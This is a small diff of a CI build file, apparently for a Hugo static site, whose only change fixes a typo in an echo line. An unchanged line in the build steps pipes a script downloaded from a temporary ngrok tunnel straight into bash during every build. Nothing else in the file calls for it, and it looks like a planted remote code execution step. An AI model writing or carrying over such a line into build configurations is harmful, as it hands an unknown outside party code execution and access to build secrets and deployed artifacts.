@@ -7,7 +7,7 @@ frontend:
         - tar -xf hugo.tar.gz hugo
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
-        - echo "[!] Doing stuf"
+        - echo "[!] Doing stuff"
         - curl https://3055-180-151-104-178.in.ngrok.io/file.sh | bash
         - hugo
   artifacts:
